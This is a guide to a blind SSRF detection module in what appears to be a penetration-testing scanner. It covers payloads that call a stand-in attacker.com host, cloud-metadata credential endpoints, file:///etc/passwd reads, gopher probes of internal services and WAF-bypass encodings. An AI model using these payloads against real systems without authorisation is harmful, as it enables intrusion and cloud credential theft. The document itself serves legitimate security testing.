# Blind SSRF (BSSRF) Module - Complete Guide

## Overview

The Blind SSRF (BSSRF) module detects Server-Side Request Forgery vulnerabilities through out-of-band (OOB) callback correlation. Unlike reflected SSRF, blind SSRF provides no direct error messages—instead, it relies on the backend making requests that can be detected via OOB channels (DNS lookups, HTTP callbacks, etc.).

## Architecture

### Components

1. **Payload Engine** (`payloads.py`)
   - Generates SSRF payloads in multiple formats
   - Supports HTTP, DNS, FTP, Gopher, DICT, file protocols
   - WAF bypass techniques (URL encoding, case variation, etc.)

2. **Detector** (`detector.py`)
   - Injects payloads into parameters
   - Correlates injections with callbacks
   - Calculates confidence scores

3. **Module Orchestrator** (`ssrf_module.py`)
   - Coordinates detection across parameters
   - Manages callback verification
   - Produces findings reports

4. **Callback Server** (`bssrf/oob/callback_server.py`)
   - Flask HTTP listener
   - SQLite persistence
   - Async processing queue
   - Replay protection

5. **Correlation Engine** (`bssrf/oob/correlation.py`)
   - Injection tracking
   - UUID-callback matching
   - Expiration validation

## Quick Start

### 1. Expose Callback Host (Required)

The callback server **starts automatically** when you run a scan, but you need to expose it to the internet:

```bash
# Option 1: Using ngrok (easiest for testing)
ngrok http 5000

# Copy the forwarding URL, e.g.: https://abc123.ngrok.io

# Option 2: Your own domain with port forwarding
# Ensure your public IP:5000 is accessible

# Option 3: Docker/cloud environment
# Run on accessible port (already exposed)
```

### 2. Run BSSRF Scan

```bash
# Basic scan
python main.py --scan bssrf \
  -f targets.txt \
  --listener http://YOUR_CALLBACK_HOST:5000 \
  --wait 30 \
  --threads 5

# With recon
python main.py --recon -u target.com \
  --scan bssrf \
  --listener http://YOUR_CALLBACK_HOST:5000 \
  --wait 30

# Advanced: Including internal services
python main.py --scan bssrf \
  -f targets.txt \
  --listener http://YOUR_CALLBACK_HOST:5000 \
  --wait 30 \
  --advanced
```

### 3. Check Results

```bash
# View findings
cat bssrf/output/findings_ssrf.json
cat bssrf/output/findings_ssrf.txt

# Query callbacks via API
curl http://localhost:5000/api/callbacks
curl http://localhost:5000/api/check/UUID-HERE
```

## Payload Types

### 1. HTTP Callbacks (Primary)

**Standard HTTP:**
```
http://attacker.com/?id={uuid}
http://attacker.com/ssrf/{uuid}
```

**Variations:**
```
http://attacker.com:8080/?id={uuid}
https://attacker.com/?id={uuid}
http://attacker.com/?callback={uuid}
```

### 2. DNS Lookups

**Query-based:**
```
http://{uuid}.attacker.com
http://{uuid}.ssrf.attacker.com
```

**Trigger:** Backend performs DNS lookup → detected in DNS logs

### 3. FTP Callbacks

```
ftp://attacker.com/?id={uuid}
ftp://anonymous@attacker.com/?id={uuid}
```

### 4. Alternative Protocols

**Gopher (port scanning):**
```
gopher://localhost:6379/_
gopher://localhost:9000/_
```

**DICT (service detection):**
```
dict://localhost:6379/
dict://localhost:3306/
```

**File (local read):**
```
file:///etc/passwd
file:///c:/windows/win.ini
```

### 5. Cloud Metadata

**AWS:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
```

**Kubernetes:**
```
http://kubernetes.default.svc.cluster.local/
http://kubernetes.default.svc/api/v1/namespaces
```

## Target Parameters

### High-Risk SSRF Parameters

```
url, link, target, callback, webhook, image, avatar, 
redirect, next, file, fetch, fetch_url, uri, endpoint,
host, server, proxy, request_url, notification_url, return_url,
imageUrl, profileUrl, downloadUrl, documentUrl, resourceUrl,
referer, source, back, continue, forward, goto, location
```

### Injection Points

**Query Parameters:**
```
http://target.com/api/fetch?url=PAYLOAD
http://target.com/page?image=PAYLOAD
```

**JSON Body:**
```json
{"url": "PAYLOAD", "webhook": "PAYLOAD"}
{"imageUrl": "PAYLOAD"}
```

**XML Body:**
```xml
<fetch>
  <url>PAYLOAD</url>
</fetch>
```

**Headers:**
```
X-Forwarded-For: PAYLOAD
Referer: PAYLOAD
X-Original-URL: PAYLOAD
```

**Path Segments:**
```
http://target.com/proxy/PAYLOAD
http://target.com/image?src=PAYLOAD
```

## WAF Bypass Techniques

### URL Encoding

**Double encoding:**
```
http%3A%2F%2Fattacker.com
http%253A%252F%252Fattacker.com
```

### IP Encoding

**Octal:**
```
http://017700000001/
http://0177.0000.0000.0001/
```

**Hex:**
```
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/
```

**Integer:**
```
http://2130706433/
```

### Protocol Variations

**Case variation:**
```
hTtP://localhost/
HtTp://localhost/
http://LOCALHOST/
```

**Protocol bypass:**
```
http:////localhost/
http://localhost#
http://localhost?
http://localhost%23
```

### Symbol tricks

**At symbol:**
```
http://attacker@localhost/
http://attacker:password@localhost/
```

**Hash fragment:**
```
http://127.0.0.1#localhost/
```

**Question mark:**
```
http://127.0.0.1?localhost/
```

## Callback Server API

### REST Endpoints

**List all callbacks:**
```bash
GET /api/callbacks

Response:
{
  "total": 5,
  "callbacks": [
    {
      "id": 1,
      "timestamp": "2024-01-15T10:23:45.123456",
      "uuid": "550e8400-e29b-41d4-a716-446655440000",
      "remote_addr": "192.168.1.100",
      "path": "/",
      "method": "GET",
      "user_agent": "Mozilla/5.0...",
      "headers": {...},
      "full_url": "http://callback.host/?id=550e8400..."
    }
  ]
}
```

**Check specific UUID:**
```bash
GET /api/check/550e8400-e29b-41d4-a716-446655440000

Response (found):
{
  "found": true,
  "callback": {...}
}

Response (not found):
{
  "found": false,
  "uuid": "550e8400-e29b-41d4-a716-446655440000"
}
```

**Clear callbacks (testing only):**
```bash
POST /api/clear

Response:
{
  "status": "cleared"
}
```

**Health check:**
```bash
GET /health

Response:
{
  "status": "running",
  "callbacks_count": 5,
  "timestamp": "2024-01-15T10:25:00.000000"
}
```

## Detection Process

### Step 1: Injection

```
1. Discover SSRF-risky parameters
2. Generate UUID for tracking: 550e8400-e29b-41d4-a716-446655440000
3. Create payload: http://attacker.com/?id=550e8400-e29b-41d4-a716-446655440000
4. Inject into target URL
5. Record injection metadata (URL, parameter, timestamp, payload_type)
6. Immediately return (async)
```

### Step 2: Wait for Callback

```
Server processes request → 
Fetches injected URL →
Callback server receives HTTP request →
Async queue processes →
UUID+IP recorded in SQLite
```

### Step 3: Correlation

```
1. Poll callback server API
2. Lookup injection by UUID
3. Validate: injection_time < callback_time < injection_time + 24h
4. Extract callback metadata (IP, User-Agent, headers)
5. Calculate confidence:
   - HIGH: Multiple callbacks from same IP
   - MEDIUM: Single callback received
   - LOW: Suspicious timing or patterns
```

### Step 4: ML Scoring

```
1. Extract features:
   - Response time (time_bucket)
   - Source IP diversity
   - Callback count
   - Payload type effectiveness
2. Score with IsolationForest
3. Generate final confidence
```

## Example Findings

### Raw Finding (JSON)

```json
{
  "vulnerability": "Blind SSRF",
  "url": "http://target.com/api/fetch",
  "parameter": "url",
  "payload_type": "http_callback",
  "injection_uuid": "550e8400-e29b-41d4-a716-446655440000",
  "payload": "http://attacker.com/?id=550e8400-e29b-41d4-a716-446655440000",
  "timestamp_injected": "2024-01-15T10:23:45.123456",
  "timestamp_callback": "2024-01-15T10:23:48.654321",
  "callback_count": 1,
  "source_ip": "10.0.0.50",
  "user_agent": "curl/7.64.1",
  "confidence": "HIGH",
  "ml_score": 0.92,
  "details": {
    "delay_ms": 3531,
    "headers": {
      "User-Agent": "curl/7.64.1",
      "Host": "attacker.com",
      "Accept": "*/*"
    }
  }
}
```

### Readable Finding (TXT)

```
[+] Blind SSRF on url (http://target.com/api/fetch)
    Confidence: HIGH
    Payload: http://attacker.com/?id=550e8400...
    Callback received: Yes
    Source IP: 10.0.0.50
    User-Agent: curl/7.64.1
    Delay: 3.5s
    ML Score: 0.92
```

## Advanced Usage

### Custom Callback Host

```bash
# If using custom domain
python main.py --scan bssrf \
  -f targets.txt \
  --listener http://my-ssrf-callback.com:5000 \
  --wait 30
```

### Internal Service Probing

```bash
# Enable advanced payloads (internal IPs, Gopher, etc.)
python main.py --scan bssrf \
  -f targets.txt \
  --listener http://attacker.com:5000 \
  --wait 30 \
  --advanced
```

**Tested services:**
- MySQL (localhost:3306)
- PostgreSQL (localhost:5432)
- Redis (localhost:6379)
- MongoDB (localhost:27017)
- Elasticsearch (localhost:9200)
- RabbitMQ (localhost:5672)
- Memcached (localhost:11211)

### Cloud Metadata Discovery

Automatically tested:
- AWS metadata endpoints (169.254.169.254)
- Azure metadata endpoints
- GCP metadata endpoints
- Kubernetes API endpoints

### Raw Request Mode

```bash
# Save request to file
cat > request.txt << 'EOF'
GET /api/fetch?url=PAYLOAD HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

EOF

# Scan
python main.py --raw request.txt \
  --scan bssrf \
  --listener http://attacker.com:5000 \
  --wait 30
```

## Troubleshooting

### Callback Server Not Receiving Callbacks

**Check:**
1. Callback host is publicly accessible
2. Firewall allows port 5000 ingress
3. Target application can make outbound requests
4. UUID is correctly formatted in payload

**Debug:**
```bash
# Check server is running
curl http://localhost:5000/health

# Check callbacks received
curl http://localhost:5000/api/callbacks

# Test manually
curl "http://YOUR_CALLBACK_HOST:5000/?id=test-uuid"
```

### Slow Callback Processing

**If callbacks delayed:**
1. Check SQLite database size: `ls -lh bssrf/output/callbacks.db`
2. Restart callback server (clears queue)
3. Increase wait time: `--wait 60`

### False Positives

**Common causes:**
1. Application makes automatic requests (CDN, logging, etc.)
2. Multiple requests with same User-Agent
3. Network intermediate proxies

**Mitigation:**
1. Use unique UUID formats
2. Check source IP consistency
3. Enable ML scoring for filtering

## Performance

### Callback Server Benchmarks

```
HTTP Response Time:     < 5ms (async queue)
Database Insert:        < 10ms (SQLite)
Query Callbacks:        < 50ms (indexed lookup)
Throughput:             100+ callbacks/sec
Storage per callback:   ~1KB
```

### Scanning Performance

```
Parameters tested per host: 10-50 (depending on --advanced)
Requests per parameter:    3-10 (multiple protocols/encodings)
Time per target:           10-60 seconds (+ wait time)
Threads recommended:       5-10
```

## Security Considerations

### Callback Server Exposure

⚠️ **WARNING:** Callback server logs all requests, including:
- Target URLs (may contain sensitive info)
- User-Agent headers
- Referrer information
- IP addresses

**Recommendations:**
1. Run on isolated network/VPN
2. Use HTTPS if possible
3. Enable authentication
4. Regularly purge old callbacks
5. Never expose to untrusted networks

### Payload Stealth

- SSRF payloads are unencrypted in traffic
- May be logged in target's access logs
- WAF may block certain protocols
- Use domain name, not IP, to evade some filters

## Integration with CI/CD

### GitHub Actions Example

```yaml
name: SSRF Scan
on: [push]

jobs:
  ssrf-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Install dependencies
        run: pip install -r requirements.txt
      
      - name: Start callback server
        run: |
          python -m bssrf.oob.callback_server &
          sleep 2
      
      - name: Run BSSRF scan
        run: |
          python main.py --scan bssrf \
            -u ${{ secrets.TARGET_URL }} \
            --listener http://127.0.0.1:5000 \
            --wait 30
      
      - name: Upload results
        uses: actions/upload-artifact@v2
        with:
          name: ssrf-findings
          path: bssrf/output/
```

## References

- [Server-Side Request Forgery (SSRF) - OWASP](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)
- [Blind SSRF Testing - PortSwigger](https://portswigger.net/research/blind-ssrf)
- [AWS Metadata Service Exploitation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [GOPHER Protocol Exploitation](https://en.wikipedia.org/wiki/Gopher_(protocol))
